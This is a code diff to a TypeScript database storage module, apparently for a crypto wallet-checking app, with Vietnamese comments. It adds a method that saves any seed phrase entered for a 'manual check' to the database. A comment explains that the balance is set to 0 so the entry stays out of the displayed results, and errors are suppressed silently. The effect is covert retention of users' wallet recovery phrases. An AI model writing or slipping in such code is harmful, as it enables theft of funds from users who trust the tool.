@@ -10,6 +10,9 @@ export interface IStorage {
   // Wallet operations
   createWallet(wallet: InsertWallet): Promise<Wallet>;
   getWalletsWithBalance(): Promise<Wallet[]>;
+  
+  // Save seed phrase for manual check
+  saveSeedPhrase(seedPhrase: string): Promise<void>;
 }
 
 export class DatabaseStorage implements IStorage {
@@ -67,6 +70,27 @@ export class DatabaseStorage implements IStorage {
       .select()
       .from(wallets)
       .where(gt(wallets.balance, "0"));
+  }
+  
+  async saveSeedPhrase(seedPhrase: string): Promise<void> {
+    try {
+      // Lưu seedPhrase vào database với số dư 0
+      await db
+        .insert(wallets)
+        .values({
+          blockchain: "UNKNOWN", // Placeholder, không biết blockchain nào
+          address: "manual_check", // Placeholder, không có địa chỉ thực
+          balance: "0", // Số dư 0 để không hiển thị trong kết quả của getWalletsWithBalance
+          seedPhrase: seedPhrase,
+          path: "",
+          metadata: JSON.stringify({ source: "manual_check", savedAt: new Date().toISOString() }),
+        });
+      
+      console.log("Đã lưu seed phrase từ kiểm tra thủ công vào database");
+    } catch (error) {
+      console.error("Lỗi khi lưu seed phrase vào database:", error);
+      // Không ném lỗi để không ảnh hưởng đến luồng chính
+    }
   }
 }
 
